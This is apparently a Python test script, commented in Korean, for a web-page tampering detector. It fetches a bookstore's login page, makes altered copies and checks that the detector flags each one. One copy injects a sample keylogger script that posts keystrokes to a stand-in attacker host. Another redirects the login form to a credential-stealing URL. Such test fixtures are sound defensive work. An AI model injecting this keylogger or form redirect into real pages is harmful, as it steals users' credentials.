#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
변조 감지 로직 테스트 스크립트
로컬 HTTP 서버를 통해 원본 HTML과 변조된 HTML을 비교해서 감지 로직이 올바르게 작동하는지 확인
"""

import requests
import hashlib
import os
import subprocess
import time
import shutil
from pathlib import Path
from simple_compare import is_html_changed

# 테스트용 설정
TEST_DATABASE_PATH = "test_snapshots_monitor.db"
TEST_LOG_FILE = "test_monitor.log"
TEST_CSV_REPORT = "test_monitoring_report_simple.csv"

def setup_test_environment():
    """테스트 환경 설정 - 기존 테스트 파일들 정리"""
    print("🧹 테스트 환경 정리 중...")
    
    # 기존 테스트 파일들 삭제
    test_files = [
        TEST_DATABASE_PATH,
        TEST_LOG_FILE,
        TEST_CSV_REPORT,
        "test_pages"
    ]
    
    for file_path in test_files:
        if os.path.exists(file_path):
            if os.path.isdir(file_path):
                shutil.rmtree(file_path)
            else:
                os.remove(file_path)
            print(f"✅ 기존 {file_path} 삭제됨")
    
    print("✅ 테스트 환경 정리 완료")

# 테스트용 설정을 config_test.py에서 직접 import
def get_test_config():
    """테스트용 설정 반환"""
    import config_test as test_config
    print("✅ 테스트용 설정 로드: config_test.py")
    return test_config

def download_original_page():
    """원본 페이지 다운로드"""
    print("📥 원본 페이지 다운로드 중...")
    
    url = "https://mmbr.kyobobook.co.kr/login"
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    
    try:
        response = requests.get(url, headers=headers, timeout=30)
        response.raise_for_status()
        return response.text
    except Exception as e:
        print(f"❌ 원본 페이지 다운로드 실패: {e}")
        return None

def create_test_files(original_html):
    """테스트용 HTML 파일들 생성"""
    print("🔧 테스트 파일들 생성 중...")
    
    # 테스트 디렉토리 생성
    test_dir = Path("test_pages")
    test_dir.mkdir(exist_ok=True)
    
    # 1. 원본 파일
    with open(test_dir / "original.html", "w", encoding="utf-8") as f:
        f.write(original_html)
    print("✅ 원본 파일 생성: test_pages/original.html")
    
    # 2. URL 변조 파일
    url_modified = original_html.replace(
        'https://mmbr.kyobobook.co.kr',
        'https://evil-site.com'
    ).replace(
        'action="/login"',
        'action="https://malicious-login.com/steal"'
    )
    with open(test_dir / "url_modified.html", "w", encoding="utf-8") as f:
        f.write(url_modified)
    print("✅ URL 변조 파일 생성: test_pages/url_modified.html")
    
    # 3. 콘텐츠 변조 파일 (악성 스크립트 삽입)
    malicious_script = '''
    <script>
    // 악의적인 키로거 스크립트
    document.addEventListener('keypress', function(e) {
        fetch('https://hacker-server.com/keylog', {
            method: 'POST',
            body: JSON.stringify({key: e.key, target: e.target.name})
        });
    });
    </script>'''
    
    content_modified = original_html.replace('</head>', f'{malicious_script}</head>')
    with open(test_dir / "content_modified.html", "w", encoding="utf-8") as f:
        f.write(content_modified)
    print("✅ 콘텐츠 변조 파일 생성: test_pages/content_modified.html")
    
    # 4. 텍스트 변조 파일
    text_modified = original_html.replace(
        '교보문고',
        '가짜문고'
    ).replace(
        '로그인',
        '정보입력'
    )
    with open(test_dir / "text_modified.html", "w", encoding="utf-8") as f:
        f.write(text_modified)
    print("✅ 텍스트 변조 파일 생성: test_pages/text_modified.html")
    
    # 5. 미묘한 변조 파일 (공백 추가)
    subtle_modified = original_html.replace('<title>', '<title> ')
    with open(test_dir / "subtle_modified.html", "w", encoding="utf-8") as f:
        f.write(subtle_modified)
    print("✅ 미묘한 변조 파일 생성: test_pages/subtle_modified.html")
    
    return test_dir

def start_local_server(test_dir):
    """로컬 HTTP 서버 시작"""
    print(f"\n🌐 로컬 HTTP 서버 시작 중... (포트 8000)")
    print(f"서버 디렉토리: {test_dir}")
    
    try:
        # 서버 프로세스 시작
        server_process = subprocess.Popen(
            ["python", "-m", "http.server", "8000"],
            cwd=test_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # 서버 시작 대기
        time.sleep(2)
        
        # 서버 상태 확인
        try:
            response = requests.get("http://localhost:8000/original.html", timeout=5)
            if response.status_code == 200:
                print("✅ 로컬 서버가 정상적으로 시작되었습니다.")
                return server_process
            else:
                print("❌ 서버 응답이 비정상입니다.")
                return None
        except Exception as e:
            print(f"❌ 서버 연결 실패: {e}")
            return None
            
    except Exception as e:
        print(f"❌ 서버 시작 실패: {e}")
        return None

def test_via_local_server(server_process):
    """로컬 서버를 통한 변조 감지 테스트"""
    print("\n🧪 로컬 서버를 통한 변조 감지 테스트")
    print("=" * 60)
    
    # 원본 페이지 가져오기
    try:
        original_response = requests.get("http://localhost:8000/original.html", timeout=10)
        original_response.raise_for_status()
        original_html = original_response.text
        print(f"✅ 원본 페이지 로드: {len(original_html):,}자")
    except Exception as e:
        print(f"❌ 원본 페이지 로드 실패: {e}")
        return None
    
    # 테스트 케이스들
    test_cases = [
        ("url_modified.html", "URL 변조"),
        ("content_modified.html", "콘텐츠 변조 (악성 스크립트)"),
        ("text_modified.html", "텍스트 변조"),
        ("subtle_modified.html", "미묘한 변조 (공백)")
    ]
    
    results = {}
    
    for filename, test_name in test_cases:
        print(f"\n📋 {test_name} 테스트")
        print("-" * 40)
        
        try:
            # 변조된 페이지 가져오기
            modified_response = requests.get(f"http://localhost:8000/{filename}", timeout=10)
            modified_response.raise_for_status()
            modified_html = modified_response.text
            
            # 해시 비교
            original_hash = hashlib.sha256(original_html.encode('utf-8')).hexdigest()
            modified_hash = hashlib.sha256(modified_html.encode('utf-8')).hexdigest()
            hash_different = original_hash != modified_hash
            
            # 변조 감지 로직 테스트
            change_detected = is_html_changed(original_html, modified_html)
            
            # 로그 파일에 해시 정보 기록
            log_message = f"테스트 [{test_name}] - 원본 해시: {original_hash[:16]}..., 변조본 해시: {modified_hash[:16]}..., 해시 일치: {not hash_different}, 변조 감지: {change_detected}"
            with open(TEST_LOG_FILE, "a", encoding="utf-8") as log_file:
                log_file.write(f"{log_message}\n")
            
            # 결과 출력
            print(f"  해시 비교 결과: {'다름' if hash_different else '동일'}")
            print(f"  감지 로직 결과: {'변조 감지됨' if change_detected else '변조 감지 안련'}")
            print(f"  변조본 크기: {len(modified_html):,}자")
            print(f"  변조본 해시: {modified_hash[:20]}...")
            print(f"  로그 기록: {log_message}")
            
            # 일치성 확인
            if hash_different == change_detected:
                print("  ✅ 해시 비교와 감지 로직 결과 일치")
                status = "성공"
            else:
                print("  ❌ 해시 비교와 감지 로직 결과 불일치")
                status = "실패"
            
            results[test_name] = {
                'hash_different': hash_different,
                'change_detected': change_detected,
                'status': status,
                'size_diff': len(modified_html) - len(original_html)
            }
            
        except Exception as e:
            print(f"  ❌ {filename} 테스트 실패: {e}")
            results[test_name] = {
                'hash_different': False,
                'change_detected': False,
                'status': "실패",
                'size_diff': 0
            }
    
    return results

def test_monitoring_system_with_config(test_config):
    """테스트 config로 모니터링 시스템 테스트"""
    print("\n🔍 테스트 config로 모니터링 시스템 테스트")
    print("=" * 60)
    
    try:
        # monitor.py의 함수를 import하되 config를 파라미터로 전달
        from monitor import get_current_snapshot, save_snapshot, log_message
        from database import create_tables
        from csv_report import create_csv_report
        import requests
        
        # 데이터베이스 초기화
        create_tables(test_config.DATABASE_PATH)
        
        print("📊 첫 번째 모니터링 실행 (기준점 생성)...")
        
        # 첫 번째 스냅샷 수집
        snapshot1 = get_current_snapshot(test_config.TARGET_URL)
        if snapshot1:
            save_snapshot(snapshot1, test_config.DATABASE_PATH)
            log_message("첫 번째 스냅샷 수집 완료", test_config.LOG_FILE)
        
        time.sleep(2)
        
        print("📊 두 번째 모니터링 실행 (변조 감지)...")
        
        # 두 번째 스냅샷 - 변조된 URL로 수집
        modified_url = "http://localhost:8000/content_modified.html"
        snapshot2 = get_current_snapshot(modified_url)
        if snapshot2:
            save_snapshot(snapshot2, test_config.DATABASE_PATH)
            log_message(f"두 번째 스냅샷 수집 완료 (URL: {modified_url})", test_config.LOG_FILE)
        
        # CSV 보고서 생성
        create_csv_report(test_config.DATABASE_PATH, test_config.CSV_REPORT_SIMPLE)
        
        # 결과 확인
        print("\n📋 모니터링 결과 확인:")
        if os.path.exists(TEST_LOG_FILE):
            with open(TEST_LOG_FILE, "r", encoding="utf-8") as f:
                log_content = f.read()
                print("로그 파일 내용:")
                print(log_content[-500:])  # 마지막 500자만 출력
        
        if os.path.exists(TEST_CSV_REPORT):
            with open(TEST_CSV_REPORT, "r", encoding="utf-8") as f:
                csv_content = f.read()
                print("\nCSV 보고서 내용:")
                print(csv_content)
        
        return True
        
    except Exception as e:
        print(f"❌ 모니터링 시스템 테스트 실패: {e}")
        return False
    
    except Exception as e:
        print(f"❌ 모니터링 시스템 테스트 실패: {e}")
        return False
    
    return True

def print_summary(results):
    """테스트 결과 요약"""
    print("=" * 60)
    print("🔍 테스트 결과 요약")
    print("=" * 60)
    
    success_count = 0
    total_count = len(results)
    
    for test_name, result in results.items():
        status_icon = "✅" if result['status'] == "성공" else "❌"
        size_change = f"({result['size_diff']:+d}자)" if result['size_diff'] != 0 else "(크기 동일)"
        
        print(f"{status_icon} {test_name}: {result['status']} {size_change}")
        
        if result['status'] == "성공":
            success_count += 1
    
    print()
    print(f"📊 전체 결과: {success_count}/{total_count} 성공")
    
    if success_count == total_count:
        print("🎉 모든 테스트가 성공했습니다! 변조 감지 로직이 올바르게 작동합니다.")
    else:
        print("⚠️  일부 테스트가 실패했습니다. 감지 로직을 검토해주세요.")

def cleanup(server_process):
    """서버 프로세스 정리"""
    if server_process:
        print("\n🛑 로컬 서버 종료 중...")
        server_process.terminate()
        server_process.wait()
        print("✅ 서버가 종료되었습니다.")

def main():
    """메인 테스트 함수"""
    print("🧪 로컬 HTTP 서버를 통한 변조 감지 로직 테스트")
    print("=" * 60)
    
    server_process = None
    
    try:
        # 1. 테스트 환경 설정
        setup_test_environment()
        test_config = get_test_config()
        
        # 2. 원본 페이지 다운로드
        original_html = download_original_page()
        if not original_html:
            print("❌ 테스트를 진행할 수 없습니다.")
            return
        
        print(f"✅ 원본 페이지 다운로드 완료: {len(original_html):,}자")
        
        # 3. 테스트 파일들 생성
        test_dir = create_test_files(original_html)
        print(f"✅ 테스트 파일들 생성 완료")
        
        # 4. 로컬 HTTP 서버 시작
        server_process = start_local_server(test_dir)
        if not server_process:
            print("❌ 서버 시작에 실패했습니다.")
            return
        
        # 5. 로컬 서버를 통한 감지 로직 테스트
        results = test_via_local_server(server_process)
        
        if results:
            # 6. 결과 요약
            print_summary(results)
            
            # 7. 실제 모니터링 시스템 테스트
            test_monitoring_system_with_config(test_config)
        else:
            print("❌ 테스트 실행에 실패했습니다.")
    
    except KeyboardInterrupt:
        print("\n⚠️  사용자에 의해 테스트가 중단되었습니다.")
    
    finally:
        # 8. 정리
        cleanup(server_process)
        print("\n🏁 테스트 완료")
        print(f"📁 테스트 파일들:")
        print(f"  - 데이터베이스: {TEST_DATABASE_PATH}")
        print(f"  - 로그 파일: {TEST_LOG_FILE}")
        print(f"  - CSV 보고서: {TEST_CSV_REPORT}")
        print(f"  - 테스트 페이지: test_pages/")

if __name__ == "__main__":
    main()